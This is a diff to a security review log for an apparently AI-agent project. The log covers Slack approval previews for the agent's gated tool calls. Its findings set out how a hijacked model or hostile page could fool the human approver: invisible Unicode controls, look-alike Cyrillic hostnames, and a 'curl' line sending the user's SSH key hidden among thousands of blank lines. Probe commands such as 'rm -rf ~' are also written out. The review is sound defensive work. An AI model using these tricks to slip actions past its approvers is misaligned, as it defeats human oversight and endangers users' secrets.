@@ -5,7 +5,63 @@ that list), then **verify** (uncommitted working tree on top of `59b37da`: new
 A25, `src/tools/net-guard.ts`, and fixes for H1/H2/M2/M3). Reviewer may edit
 only `test/**` and this file.
 
-## Verify round 2 (latest)
+## Verify round 4 (latest)
+
+Scope: REVIEW-M14 and REVIEW-L16, plus the source cleanup that turned raw
+invisible characters in our own code into ASCII escapes. The changes under
+review, all uncommitted:
+- `src/slack.ts`: `HIDDEN_CHARS` adds `\p{Default_Ignorable_Code_Point}` and a literal `⟨` (tokenised, not counted); `TOKEN_OR_CHAR` is bounded to `{4,6}`; the ZWSP at `:124` is now `'\u200B'`.
+- `src/skills.ts:288`, `:309`: the BOM in both regexes is now `\uFEFF`.
+- `docs/AMENDMENTS.md`: two new lines at the end of the A26 "faithful" bullet.
+
+| Check | Result |
+|---|---|
+| `npx tsc --noEmit` | **0 errors** |
+| `npx vitest run` (new source, before my test edits) | 2 failed: the M14 and L16 `it.fails`, which now fail because both fixes work. |
+| `npx vitest run` (after) | **263 passed / 0 failed / 2 expected-fail (REVIEW-M15, L17 evidence, `it.fails`) / 13 skipped / 1 todo** (279 total, 19 files passed, 2 skipped) |
+| Live LLM calls, Slack API calls, Docker commands | **0** |
+
+**Open Critical/High: none.** Still open: REVIEW-M15 (Medium), REVIEW-L17 (Low).
+
+| ID | Verdict | Evidence |
+|---|---|---|
+| REVIEW-M14 | **Fixed** | `test/review-slack.test.ts` "REVIEW-M14 regression" (6 tests). (1) The round-3 giant-hex probe (`rm -rf ~ #⟨U+` + 11,900 × `A` + `⟩`, 11,914 chars) now renders with every section under 3,000. Every section is whole units, the de-escaped text is `…#⟨U+27E8⟩U+AAAA…⟩`, and there is no warning. (2) A typed `⟨U+202E⟩` renders as `⟨U+27E8⟩U+202E⟩` with `count` 0. A real U+202E renders as `⟨U+202E⟩` with `count` 1. Mixed together, the warning counts 1, and every `⟨` in the output opens a real token. That makes the encoding injective, which closes accepted gap (c) from round 3. (3) A lone `⟩` and partial tokens pass through as plain text. (4) Worst case: 12,000 × `⟨` gives **35 blocks** (33 code sections + header + actions, no warning), with every section under 3,000. Mixes of `⟨` with U+202E and with `&`/`<`/`>` stay at or under 36. Note: with `⟨` tokenised, no raw `⟨` can reach the packer, so the `{4,6}` bound is now defence in depth and can't be observed on its own. |
+| REVIEW-L16 | **Fixed** | "REVIEW-L16 regression": U+17B4, U+17B5, U+180B–180D and U+180F each become `⟨U+XXXX⟩` with `count` 1. Together, the six in one preview give a warning of 6, and none appears raw anywhere in the blocks. The round-3 full-range scan "every Default_Ignorable code point is revealed" now runs with **no exemptions** and passes. The spec lines in A26 match the code. |
+| Source cleanup | **Verified** | New `test/review-source-hygiene.test.ts` scans every file under `src/` and fails on any raw `\p{Cf}`, `\p{Default_Ignorable_Code_Point}`, U+00A0, U+2028 or U+2029. It passes on the working tree. The same pattern run over the **HEAD** copies flags exactly the three characters that were removed: `skills.ts:288` U+FEFF, `skills.ts:309` U+FEFF, `slack.ts:124` U+200B. So the guard would have caught them. The pattern is built from `String.raw` and numeric code points, and the test checks that its own file holds no such characters. (The tool pipeline had decoded `\u00A0\u2028\u2029` in a doc comment into raw characters; I caught it with a byte check and rewrote the line.) A scan of `test/**` and `docs/**` also finds none. |
+| skills.ts BOM handling | **Covered** (previously untested) | `test/review-source-hygiene.test.ts`, through the public API: (1) a BOM-prefixed skill file parses its description, schedule, model and body via both `getSkill` and `loadAllSkills`; (2) a BOM + `---js` file is rejected ("must be YAML") and skipped by `loadAllSkills`, and a global marker stays unset, so nothing was evaluated; (3) `assertBodyHasNoFence` rejects BOM + `---`, BOM + blank lines + an indented `---`, and BOM + `---js`, but accepts a BOM body whose `---` comes later; (4) `saveSkill` rejects a BOM + `---` body and writes no file. Note: tests (1) and (2) would also pass without the strip at `skills.ts:309`, because gray-matter strips the BOM itself (`lib/utils.js:48`, `strip-bom-string`) and the YAML-only engines refuse `js` anyway. That strip is defence in depth. Tests (3) and (4) do depend on the `\uFEFF?` at `:288`. |
+
+No new findings this round. I probed a lone `⟩`, partial tokens and `⟨` worst-case mixes (above), and none produced a split, an oversized section or a miscount.
+
+## Verify round 3
+
+Scope: REVIEW-M13 only, against the new A26 bullet "Previews are faithful,
+too". The fix is the uncommitted change to `src/slack.ts` (`revealHiddenChars`,
+`codeSections` unit packing, the warning section in `approvalBlocks`, and
+code-point shortening in `decidedBlocks`).
+
+| Check | Result |
+|---|---|
+| `npx tsc --noEmit` | **0 errors** |
+| `npx vitest run` (before my test edits) | 211 passed / **1 failed** (the REVIEW-M13 `it.fails`, which now fails because the fix works) / 13 skipped / 1 todo. This matches the engineer's report. |
+| `npx vitest run` (after) | **248 passed / 0 failed / 4 expected-fail (REVIEW-M14, M15, L16, L17 evidence, `it.fails`) / 13 skipped / 1 todo** (266 total) |
+| Live LLM calls, Slack API calls, Docker commands | **0** |
+
+**Open Critical/High: none.**
+
+| ID | Verdict | Evidence |
+|---|---|---|
+| REVIEW-M13 | **Fixed** (follow-ups in M14–L17 below) | `test/review-slack.test.ts`. The M13 `it.fails` is now a plain `it` ("REVIEW-M13 regression"), and 36 new tests cover the A26 bullet. (1) **Tokens:** `revealHiddenChars` maps U+202E, U+200B, U+FEFF, U+00A0, U+2028/2029, U+E0041 (astral tag, one token, not two), U+FE0F, U+E0100, both lone surrogates, CR, NUL, U+2066, U+034F, U+3164 and U+00AD to `⟨U+XXXX⟩` with uppercase hex padded to 4 digits, and `count` is right. `\n`, `\t` and space are untouched. A full scan of U+0000–10FFFF finds every `White_Space` code point revealed, and every `Default_Ignorable_Code_Point` revealed **except six** (REVIEW-L16). `\p{C}` also reveals private-use and unassigned code points, which is stricter than the spec. (2) **Renderer ZWSP:** it is still inserted between adjacent backticks after the substitution, raw and without a token, while a ZWSP from the input becomes `⟨U+200B⟩`. `unescapeForDisplay` still round-trips backticks and escapes exactly for text with no hidden characters, and returns the revealed text when there are hidden ones. (3) **Warning:** it sits at block index 1, directly above the code, with the right count (4 in the test), and the buttons stay. It is absent for plain commands, backticks, escapes, plain emoji and Hebrew text. A literal `⟨U+202E⟩` typed into the input isn't counted. An over-limit preview still gets the no-buttons notice and no warning. (4) **No split:** a token arriving at every offset around the section boundary moves whole to the next section, and an 11k mixed preview (tokens, astral tokens, entities, emoji, backticks, a lone surrogate), tested at 10 alignments, gives sections that are all whole units with no lone surrogate and lose nothing. (5) **Worst case:** 12,000 × U+202E gives **36 blocks, longest section 2,976**, confirming the engineer's figures. 12,000 lone surrogates and 7 hidden/`&`/`<`/`>`/backtick/astral mixes at 8 alignments each stay at or under 36 blocks with every section under 3,000. A hidden BMP character (1 → 8) is the largest expansion per UTF-16 unit, so this is the ceiling, with one exception: REVIEW-M14. (6) **`decidedBlocks`** reveals hidden characters, and with a 2,500-code-point cut that lands on an emoji or an astral tag, it keeps the pair whole (no `⟨U+D83D⟩`/`⟨U+DB40⟩`). **Accepted gaps, not findings:** (a) stacked combining marks (50 × U+0301) are visible as glyph pile-ups and don't reorder text; (b) strong RTL letters (Hebrew, Arabic) can reorder neighbouring digits and punctuation under the bidi algorithm without any control character, but the script itself is visible and the spec deliberately lets RTL text through; (c) a literal `⟨U+XXXX⟩` in the input looks the same as a real token, but nothing reorders and the warning counts only real characters, so a mismatch shows (see the M14 fix for making the encoding injective); (d) `decidedBlocks` has no warning line and shortens without a marker, which A26 permits after a decision; (e) emoji with VS16 or ZWJ trigger the warning, a false positive by design since nothing is auto-denied. |
+
+### New findings (round 3)
+
+| ID | Severity | Amendment | File:line | Finding | Evidence | Suggested fix | Owner |
+|---|---|---|---|---|---|---|---|
+| REVIEW-M14 | **Medium**, **fixed in round 4** | A26 (sections under 3,000) | `src/slack.ts:142` (`TOKEN_OR_CHAR = /⟨U\+[0-9A-F]{4,}⟩\|[\s\S]/gu`), `:172-179` | `codeSections` re-parses the *revealed text* for tokens, and the hex run has no upper bound. A literal `⟨U+` + thousands of hex digits + `⟩` in the model's arguments becomes one packing unit, and a unit longer than the budget is emitted as one section. A 11,914-char preview (under `APPROVAL_PREVIEW_MAX`, so not auto-denied) gives an **11,912-char section**, which breaks A26's per-section rule. Slack's documented section-text limit is 3,000 chars, so `chat.postMessage` would be rejected (I did not call Slack to confirm). `agent.ts:589-598` then fails the turn with "could not post approval request". It **fails closed**: nothing runs, but the row stays PENDING with no buttons until expiry, and a hostile page can trigger it on purpose. Medium (reliability, invariant), not High: no execution and no data loss. Related: the token encoding isn't injective (accepted gap (c) under M13). | `test/review-slack.test.ts` "REVIEW-M14 evidence" (`it.fails`): asserts every section is under 3,000 for that input; it fails today. Probe: section lengths `[32, 18, 11912]`. | Bound the token to real code points (`[0-9A-F]{4,6}`), or better, have `revealHiddenChars` return the unit list so `codeSections` packs real tokens rather than re-parsing text. Optionally render a literal `⟨` from the input as `⟨U+27E8⟩`, so typed and real tokens can't look alike. As a backstop, hard-split any unit longer than the budget. | integ |
+| REVIEW-M15 | **Medium** | A25 / A26 (cross-site approval) | `src/tools/browser.ts:241` (`Target URL: ${target}`, raw); `src/slack.ts:141` | Confusables pass untouched. A cross-site `browser_navigate` to `https://www.gооgle.com/search?q=<data>` (Cyrillic `о`) displays as Google, but `new URL()` (the WHATWG parser that Chromium also uses) resolves it to `www.xn--ggle-55da.com`, a different, registrable host. A25's approval exists so a human can check *where* data goes, and a careful approver can't tell these glyphs apart. No hidden character is involved, so there is no warning. Invisible characters in a hostname aren't a vector: `new URL` drops U+200B/180B/180F and rejects U+202E/17B4, which I probed. Medium, not High: I can't show Slack's rendering (posting is out of bounds), the payload in the query string stays visible, and exploitation needs an attacker-registered look-alike domain plus a hijacked model. | `test/review-slack.test.ts` "REVIEW-M15 evidence" (`it.fails`): the real `browserApprovalPreview` + `approvalBlocks` output contains neither `xn--ggle-55da` nor a warning; it fails today. Probe: `new URL(…).hostname` → `www.xn--ggle-55da.com`. | In the navigate preview, add `Host: ${new URL(target).hostname}` (ASCII/punycode) next to the raw URL, and warn when the hostname has non-ASCII labels. Optionally warn on mixed-script tokens in any preview. | core (browser preview) + integ (warning) |
+| REVIEW-L16 | **Low**, **fixed in round 4** | A26 (faithful) | `src/slack.ts:141` `HIDDEN_CHARS`; `docs/AMENDMENTS.md` A26 list | Six `Default_Ignorable_Code_Point`s are nonspacing marks (`Mn`) and fall outside every category the A26 bullet lists: U+17B4, U+17B5 (Khmer inherent vowels) and U+180B–180D, U+180F (Mongolian free variation selectors). They reach Slack raw and render as nothing (`a` + U+17B4 + `b` shows as `ab`), so `./run` + U+180B + `.sh` shows as `./run.sh`. Low: they don't reorder text, they can't spoof a hostname (see M15), and exploiting them needs a look-alike file or command prepared in advance. The bullet's own principle ("invisible … must never reach Slack raw") covers them; its list doesn't. | `test/review-slack.test.ts` "REVIEW-L16 evidence" (`it.fails`) and a full-range scan test that passes for every other default-ignorable code point. | Add `\p{Default_Ignorable_Code_Point}` to `HIDDEN_CHARS`, which subsumes the hand-listed U+034F/115F/1160/3164/FFA0/FE00–FE0F/E0100–E01EF and these six, and say so in the A26 bullet. | integ + Lead (spec) |
+| REVIEW-L17 | **Low** | A26 (complete ≠ noticeable) | `src/slack.ts:199-232` `approvalBlocks` | Plain spaces and newlines are rightly not tokenized, but nothing signals size. `echo ok` + 5,000 newlines + `curl -d @$HOME/.ssh/id_ed25519 …` + 5,000 newlines + `echo done` renders as 4 code sections that are nearly all blank. The exfil line sits in the second one, between the opening `echo ok` and the `echo done` right above the buttons. Everything is shown, so a careful approver who scrolls will see it, which makes this Low. It relies on scrolling attention, and I couldn't check whether Slack clients collapse long sections behind "Show more" (that would need a post). | `test/review-slack.test.ts` "REVIEW-L17 evidence" (`it.fails`): no non-code block mentions a line count or a warning; it fails today. | Put the size in the header (e.g. "10,002 lines, 10,055 chars, 4 parts"), and warn when the preview has long runs of blank lines or spaces (e.g. ≥ 20 blank lines or ≥ 200 spaces in a row). | integ |
+
+## Verify round 2
 
 Scope: REVIEW-C10, REVIEW-H11, REVIEW-L12; confirm M2 is complete; re-check
 A03/A08/A11/A24/A25 gating end to end now that approval runs through
@@ -14,7 +70,7 @@ generateText `toolApproval` (new A26).
 | Check | Result |
 |---|---|
 | `npx tsc --noEmit` | **0 errors** |
-| `npx vitest run` | **211 passed / 0 failed / 1 expected-fail (REVIEW-M13 evidence, `it.fails`) / 13 skipped / 1 todo** |
+| `npx vitest run` | At round 2: 211 passed / 0 failed / 1 expected-fail (REVIEW-M13 evidence, `it.fails`) / 13 skipped / 1 todo. At round 3: 248 passed / 0 failed / 4 expected-fail / 13 skipped / 1 todo. **Current (round 4): 263 passed / 0 failed / 2 expected-fail / 13 skipped / 1 todo**; see Verify round 4. |
 | Live LLM calls this round | **0**. The end-to-end checks needed only the mock model; total is still 9 of 25. |
 
 **Open Critical/High: none.**
@@ -41,7 +97,7 @@ instead, so every gated tool depends on that wrapper. Verified:
 
 | ID | Severity | Amendment | File:line | Finding | Evidence | Suggested fix | Owner |
 |---|---|---|---|---|---|---|---|
-| REVIEW-M13 | **Medium** | A26 | `src/slack.ts` `codeSections` / `escapeMrkdwn`; `src/agent.ts:347` | The preview is now complete, but not necessarily *faithful*. Unicode bidi controls (e.g. U+202E right-to-left override) and zero-width characters in a command, URL or rule pass to Slack unchanged, so the text a human approves can display differently from what runs (the "Trojan Source" technique). Rated Medium, not High: I can show the characters reach the blocks raw, but I can't show Slack's rendering without posting to the workspace, which is out of bounds. | `test/review-slack.test.ts` "REVIEW-M13 evidence" is an `it.fails`: it asserts a U+202E in a command is made visible, the assertion fails today, so the suite stays green. When it's fixed the test will start failing and should become a plain `it`. | In approval previews, replace bidi controls (U+202A–202E, U+2066–2069, U+200E/200F) and zero-width characters (other than the renderer's own ZWSP) with visible tokens such as `⟨U+202E⟩`, or auto-deny gated calls that contain them, as A26 does for oversized ones. | integ (render) + core (deny option) |
+| REVIEW-M13 | **Medium**, **fixed in round 3** (see Verify round 3) | A26 | `src/slack.ts` `codeSections` / `escapeMrkdwn`; `src/agent.ts:347` | The preview is now complete, but not necessarily *faithful*. Unicode bidi controls (e.g. U+202E right-to-left override) and zero-width characters in a command, URL or rule pass to Slack unchanged, so the text a human approves can display differently from what runs (the "Trojan Source" technique). Rated Medium, not High: I can show the characters reach the blocks raw, but I can't show Slack's rendering without posting to the workspace, which is out of bounds. | `test/review-slack.test.ts` "REVIEW-M13 evidence" is an `it.fails`: it asserts a U+202E in a command is made visible, the assertion fails today, so the suite stays green. When it's fixed the test will start failing and should become a plain `it`. | In approval previews, replace bidi controls (U+202A–202E, U+2066–2069, U+200E/200F) and zero-width characters (other than the renderer's own ZWSP) with visible tokens such as `⟨U+202E⟩`, or auto-deny gated calls that contain them, as A26 does for oversized ones. | integ (render) + core (deny option) |
 
 ## Verify round 1
 
@@ -220,6 +276,9 @@ Owner key (per LEAD.md): **core** = `llm.ts`, `agent.ts`, `skills.ts`, `tools/**
 - `test/review-m3.test.ts`: M3 regression (passes)
 - `test/review-gating.test.ts` (round 2): end-to-end gating through `toolApproval` (A03/A08/A11/A24/A25/A26)
 - `test/review-slack.test.ts` (round 2): A26 Slack rendering regressions, plus the REVIEW-M13 `it.fails` evidence
+- `test/review-slack.test.ts` (round 3): M13 evidence converted to a regression; 36 new A26 "faithful previews" regressions; `it.fails` evidence for REVIEW-M14, M15, L16 and L17
+- `test/review-slack.test.ts` (round 4): M14 and L16 evidence converted to regressions (6 + 2 tests); the Default_Ignorable scan has no exemptions; `WHOLE_UNITS` accepts a lone `⟩` (plain text under the new spec); M15 and L17 stay `it.fails`
+- `test/review-source-hygiene.test.ts` (round 4): `src/` invisible-character guard; skills.ts BOM handling via the public API
 - `test/agent.test.ts` (round 2): line 131 assertion updated from "truncated to ~500 chars" to "complete command" per A26
 - `test/review-findings.test.ts` (round 2): C10/H11 evidence converted to regressions; L12 regressions added
 - `test/live.providers.test.ts`: budgeted live probes, gated by `LIVE_LLM=1`; skipped by default
